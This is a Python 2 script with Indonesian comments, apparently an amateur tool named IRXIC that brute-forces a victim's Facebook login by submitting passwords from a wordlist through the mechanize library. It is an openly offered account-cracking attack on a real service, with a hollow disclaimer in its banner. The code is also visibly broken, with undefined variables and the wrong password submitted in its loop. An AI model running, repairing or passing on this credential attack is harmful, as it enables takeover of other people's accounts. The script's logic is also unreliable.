#!/usr/env python
#Mau apa lu?
#Lu Ubah Nama Author tetep lu ga bakal di Anggap pro
#Lu Ganti no wa, tetap lu ga bakal di anggap pro
#Ingat hargai pembuat
#Jangan lu recode terus lu anggap script ini buatan lu
#Tidak ada membuat Tools Hack yg mudah
#Butuh ketelitian dan kesabaran
#Jadi Fucklah buat yg recode
#Tak sumpahin yg recode hidupnya bakal dalam masalah
#Makasih juga udh make ini Tools >//<

import os
import sys
import requests
import mechanize
import random
import cookielib

os.system("cd /sdcard")
os.system("touch Satan666.txt")
membuka = open("Satan666.txt", "w")
percakapan = "Kami Melihat Mu"
membuka.write(percakapan)
membuka.close()
os.system("clear")
os.system("sleep 2")

def tampilan():
    print """
            +==================================+
            |˙˙˙˙˙˙˙˙˙˙˙˙IRXIC V1.0˙˙˙˙˙˙˙˙˙˙˙˙|
            +----------------------------------|
            | Author = D@rk_Devil#666          |
            |   WA   = 089652884613            |
            |                                  |
            | - Dengan adanya Tools ini tidak  |
            |   Menjadikanmu sebagai seorang   |
            |   Hacker, Cracker ataupun yg     |
            |   lainnya, tools ini dibuat untuk|
            |   kebaikan, maka saya tidak akan |
            |   bertanggung jawab jika Tools   |
            |   ini digunakan untuk kejahatan  |
            |                                  |
            |                         TTD      |
            |                       ———————    |
            |                   D@rk_Devil#666 |
            +==================================+
            |˙˙˙˙˙˙˙˙˙˙˙˙IRXIC V1.0˙˙˙˙˙˙˙˙˙˙˙˙+
            +----------------------------------+
            
            [√] CTRL + C Untuk berhenti
            [√] Masukkan Email korban
            [!] Kami Melihat Mu...
    """
def main():
    os.system("clear")
    os.system("sleep 2")
    print tampilan
    print ("")
    emailkorban = str(raw_input("[?] Masukkan [ Email ] [ ID ] [ No Telepon ] : "))
    password123 = str(raw_input("[?] Masukkan Password List : "))
    
    useragents = [( 'User-agents', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1' )]
    
    loginfacebook = "https://www.facebook.com/login.php?login_attempt=1"
    
def server(password):
    try :
        sys.stdout.write("Trying...%s" % password )
        sys.stdout.flush()
        py.addHeaderd = [('User-agents', random.choice(useragents))]
        situs = py.open(loginfacebook)
        py.select_form(nr=0)
        
        
        #Didalam facebook
        py.form['email'] =emailkorban
        py.form['pass'] =password123
        py.submit()
        
        log = py.geturl()
        if log != loginfacebook:
            print "\n\n\n[√] Password berhasil ditemukan"
            print "\n[√] Password : %s\n" % (password)
            sys.exit(1)
    except KeyboardInterrupt:
        print "\nKeluar dari proggram\n"
        sys.exit(0)
    
def search():
    global password
    for password in passwords:
        server(password.replace("\n",""))
    
def cek():
    global py
    global passwords
    try :
        py = mechanize.Browser()
        bola = cookielib.LWPCookieJar()
        py.set_handle_robots(False)
        py.set_handle_equiv(True)
        py.set_handle_referer(True)
        py.set_handle_redirect(True)
        br.cookiejar(bola)
        br.set_handle_refresh(mechanize.__http.HTTPRefreshProcessor(), max_time=1)
    except KeyboardInterrupt:
        print ("\nKeluar dari Proggram...\n")
        sys.exit(1)
    try:
        list = open(password123, "r")
        passwords = list.readlines()
        x = 0
        while x < len(passwords):
            passwords[k] = passwords[k].strip()
            x += 1
            
    except IOError:
        print ("\n Error : Cek Kembali Worldlistmu !\n")
        sys.exit(1)
    except KeyboardInterrupt:
        print ("\nKeluar dari Proggram...\n")
        sys.exit(1)
    try:
        print tampilan
        print ("Akun yg akan di Crack : %s" %(emailkorban))
        print ("Loaded : ", len(passwords), "Password")
        print ("Mohon Tunggu...\n")
    except KeyboardInterrupt:
        print "\nKeluar dari Proggram...\n"
        sys.exit(1)
    try:
        main()
        search()
        server()
    except KeyboardInterrupt:
        print "\nKeluar Dari Proggram...\n"
        sys.exit(1)
        
if __name__ == "__main__":
    cek()